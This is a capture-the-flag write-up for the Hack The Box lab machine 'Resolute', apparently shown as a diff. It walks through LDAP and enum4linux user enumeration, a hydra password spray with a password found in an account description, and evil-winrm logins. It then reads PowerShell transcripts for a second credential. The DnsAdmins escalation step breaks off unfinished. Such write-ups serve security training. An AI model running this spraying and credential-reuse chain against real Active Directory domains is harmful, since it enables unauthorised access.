+|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=megabank,DC=local
+|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=megabank,DC=local
+|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=megabank,DC=local
+|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=megabank,DC=local
+|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=megabank,DC=local
+|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=megabank,DC=local
+|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=megabank,DC=local
+|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=megabank,DC=local
+|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=megabank,DC=local
+|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=megabank,DC=local
+|         isCriticalSystemObject: TRUE
+|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=megabank,DC=local;0]
+|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=megabank,DC=local
+|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=megabank,DC=local
+|         masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
+|         ms-DS-MachineAccountQuota: 10
+|         msDS-Behavior-Version: 7
+|         msDS-PerUserTrustQuota: 1
+|         msDS-AllUsersTrustQuota: 1000
+|         msDS-PerUserTrustTombstonesQuota: 10
+|         msDs-masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
+|         msDS-IsDomainFor: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
+|         msDS-NcType: 0
+|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
+|         dc: megabank
+|     dn: CN=Users,DC=megabank,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: Users
+|         description: Default container for upgraded user accounts
+|         distinguishedName: CN=Users,DC=megabank,DC=local
+|         instanceType: 4
+|         whenCreated: 2019/09/25 13:28:31 UTC
+|         whenChanged: 2019/09/25 13:28:31 UTC
+|         uSNCreated: 5888
+|         uSNChanged: 5888
+|         showInAdvancedViewOnly: FALSE
+|         name: Users
+|         objectGUID: d0ed52a-e080-9841-81d6-302cdfab7cf
+|         systemFlags: -1946157056
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
+|         dSCorePropagationData: 2019/09/27 10:52:19 UTC
+|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
+|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
+|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
+|     dn: CN=Computers,DC=megabank,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: Computers
+|         description: Default container for upgraded computer accounts
+|         distinguishedName: CN=Computers,DC=megabank,DC=local
+|         instanceType: 4
+|         whenCreated: 2019/09/25 13:28:31 UTC
+|         whenChanged: 2019/09/25 13:28:31 UTC
+|         uSNCreated: 5889
+|         uSNChanged: 5889
+|         showInAdvancedViewOnly: FALSE
+|         name: Computers
+|         objectGUID: 41e2c5ff-1512-be45-9ca1-488358ad588
+|         systemFlags: -1946157056
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
+|         dSCorePropagationData: 2019/09/27 10:52:18 UTC
+|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
+|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
+|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
+|     dn: OU=Domain Controllers,DC=megabank,DC=local
+|         objectClass: top
+|         objectClass: organizationalUnit
+|         ou: Domain Controllers
+|         description: Default container for domain controllers
+|         distinguishedName: OU=Domain Controllers,DC=megabank,DC=local
+|         instanceType: 4
+|         whenCreated: 2019/09/25 13:28:31 UTC
+|         whenChanged: 2019/09/25 13:28:31 UTC
+|         uSNCreated: 6031
+|         uSNChanged: 6031
+|         showInAdvancedViewOnly: FALSE
+|         name: Domain Controllers
+|         objectGUID: 12316bd2-27fe-3a41-90d0-471b6f5e7497
+|         systemFlags: -1946157056
+|         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=megabank,DC=local
+|         isCriticalSystemObject: TRUE
+|         gPLink: [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=megabank,DC=local;0]
+|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
+|         dSCorePropagationData: 2019/09/27 10:52:18 UTC
+|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
+|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
+|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
+|     dn: CN=System,DC=megabank,DC=local
+|         objectClass: top
+|         objectClass: container
+|         cn: System
+|         description: Builtin system settings
+|         distinguishedName: CN=System,DC=megabank,DC=local
+|         instanceType: 4
+|         whenCreated: 2019/09/25 13:28:31 UTC
+|         whenChanged: 2019/09/25 13:28:31 UTC
+|         uSNCreated: 5890
+|         uSNChanged: 5890
+|         showInAdvancedViewOnly: TRUE
+|         name: System
+|         objectGUID: 40f9d21f-49e-f54f-bf31-ad83fbc454
+|         systemFlags: -1946157056
+|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
+|         dSCorePropagationData: 2019/09/27 10:52:18 UTC
+|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
+|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
+|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
+|     dn: CN=LostAndFound,DC=megabank,DC=local
+|         objectClass: top
+|         objectClass: lostAndFound
+|         cn: LostAndFound
+|         description: Default container for orphaned objects
+|         distinguishedName: CN=LostAndFound,DC=megabank,DC=local
+|         instanceType: 4
+|         whenCreated: 2019/09/25 13:28:31 UTC
+|         whenChanged: 2019/09/25 13:28:31 UTC
+|         uSNCreated: 5886
+|         uSNChanged: 5886
+|         showInAdvancedViewOnly: TRUE
+|         name: LostAndFound
+|         objectGUID: f0581973-33c1-5a4b-aeff-69c8231b4c20
+|         systemFlags: -1946157056
+|         objectCategory: CN=Lost-And-Found,CN=Schema,CN=Configuration,DC=megabank,DC=local
+|         isCriticalSystemObject: TRUE
+|         dSCorePropagationData: 2019/09/27 22:10:48 UTC
+|         dSCorePropagationData: 2019/09/27 10:52:18 UTC
+|         dSCorePropagationData: 2019/09/26 12:35:01 UTC
+|         dSCorePropagationData: 2019/09/25 13:29:12 UTC
+|         dSCorePropagationData: 1601/07/14 04:24:33 UTC
+|     dn: CN=Infrastructure,DC=megabank,DC=local
+|         objectClass: top
+|         objectClass: infrastructureUpdate
+|         cn: Infrastructure
+
+.......
+</pre></div>
+
+<p>We get a bunch of results, which I have truncated. I’m going to enumerate other ports to see if I can get names from there.</p>
+<p>We’ll run enum4linux which is a tool for enumerating information from Windows and Samba systems. It’s a wrapper around the Samba tools smbclient, rpclient, net and nmblookup. With special configuration, you can even have it query LDAP.</p>
+<p><code>enum4linux 10.10.10.169 &gt; enum4linux-results.txt</code></p>
+<p>We get a list of domain users.</p>
+<div class="codehilite"><pre>[+] Getting domain group memberships:
+Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: MEGABANK\Administrator
+Group &#39;Domain Admins&#39; (RID: 512) has member: MEGABANK\Administrator
+Group &#39;Domain Guests&#39; (RID: 514) has member: MEGABANK\Guest
+Group &#39;Domain Computers&#39; (RID: 515) has member: MEGABANK\MS02$
+Group &#39;Domain Controllers&#39; (RID: 516) has member: MEGABANK\RESOLUTE$
+Group &#39;Enterprise Admins&#39; (RID: 519) has member: MEGABANK\Administrator
+Group &#39;Schema Admins&#39; (RID: 518) has member: MEGABANK\Administrator
+Group &#39;Contractors&#39; (RID: 1103) has member: MEGABANK\ryan
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\Administrator
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\DefaultAccount
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\krbtgt
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\ryan
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\marko
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\sunita
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\abigail
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\marcus
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\sally
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\fred
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\angela
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\felicia
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\gustavo
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\ulf
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\stevie
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\claire
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\paulo
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\steve
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\annette
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\annika
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\per
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\claude
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\melanie
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\zach
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\simon
+Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\naoki
+</pre></div>
+
+<p>Take the above usernames and save them in the file users.txt.</p>
+<div class="codehilite"><pre>root@kali:~/htb/resolute$ cat users.txt 
+Administrator
+Guest
+krbtgt
+DefaultAccount
+ryan
+marko
+sunita
+abigail
+marcus
+sally
+fred
+angela
+felicia
+gustavo
+ulf
+stevie
+claire
+paulo
+steve
+annette
+annika
+per
+claude
+melanie
+zach
+simon
+naoki
+</pre></div>
+
+<p>Also I got the interesting result for <code>marko</code> user in the description <code>Account created. Password set to Welcome123!</code> which discloses the password of newly created user.</p>
+<div class="codehilite"><pre> ============================= 
+|    Users on 10.10.10.169    |
+ ============================= 
+index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: (null)    Desc: (null)
+index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
+index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela   Name: (null)    Desc: (null)
+index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: (null)    Desc: (null)
+index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika   Name: (null)    Desc: (null)
+index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire   Name: (null)    Desc: (null)
+index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude   Name: (null)    Desc: (null)
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
+index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: (null)    Desc: (null)
+index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
+index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
+index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: (null)    Desc: (null)
+index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
+index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus   Name: (null)    Desc: (null)
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak   Desc: Account created. Password set to Welcome123!
+index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: (null)    Desc: (null)
+index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki    Name: (null)    Desc: (null)
+index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo    Name: (null)    Desc: (null)
+index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
+index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: (null)
+index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally    Name: (null)    Desc: (null)
+index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon    Name: (null)    Desc: (null)
+index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve    Name: (null)    Desc: (null)
+index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie   Name: (null)    Desc: (null)
+index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita   Name: (null)    Desc: (null)
+index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
+index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
+</pre></div>
+
+<p>So We have bunch of usernames and one password, Lets check of which user it is.</p>
+<div class="codehilite"><pre>root@kali:~/htb/resolute$ hydra -L users.txt -p Welcome123! 10.10.10.169 smb
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-06 20:14:01
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 1 task per 1 server, overall 1 task, 27 login tries (l:27/p:1), ~27 tries per task
+[DATA] attacking smb://10.10.10.169:445/
+[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
+[STATUS] 25.00 tries/min, 25 tries in 00:01h, 2 to do in 00:01h, 1 active
+[STATUS] 12.50 tries/min, 25 tries in 00:02h, 2 to do in 00:01h, 1 active
+[STATUS] 8.33 tries/min, 25 tries in 00:03h, 2 to do in 00:01h, 1 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-06 20:17:38
+</pre></div>
+
+<h2 id="initial-foothold">Initial Foothold<a class="headerlink" href="#initial-foothold" title="Permanent link"></a></h2>
+<p>Now that we have the username/password <em>melanie/Welcome123!</em>, we’ll use the <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> script to gain an initial foothold on the box.</p>
+<div class="codehilite"><pre>root@kali:~/htb/resolute$ evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!&#39;
+</pre></div>
+
+<p>We get a shell!</p>
+<p><img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/user.png" /></p>
+<p>Grab the user.txt flag.</p>
+<p><img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/user_flag.png" /></p>
+<p>Now lets obtain the user permission.</p>
+<div class="codehilite"><pre>*Evil-WinRM* PS C:\&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+</pre></div>
+
+<p>Current Users permission are very common.
+Lets enumerate more.
+I have Found a hidden folder containing the txt file.
+<img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/hidden.png" /></p>
+<p>Lets read the file</p>
+<div class="codehilite"><pre>*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+</pre></div>
+
+<p><img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/creds.png" /></p>
+<p>I got another credential for <code>ryan</code> user.</p>
+<p>Now Lets login with the <code>ryan</code> user using <code>evil-winrm</code>
+<img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/note.png" /></p>
+<p>I got a note.txt which includes hint to escalate our privileges.</p>
+<p>Lets grab the permission group to which user belongs.
+<div class="codehilite"><pre>*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+</pre></div></p>
+<p><strong>Ryan</strong> user belongs to DnsAdmin group.
+We can escalate our user privileges using </p>
+<p>Rooted :) Your feedback is appreciated !</p></article></body></html>
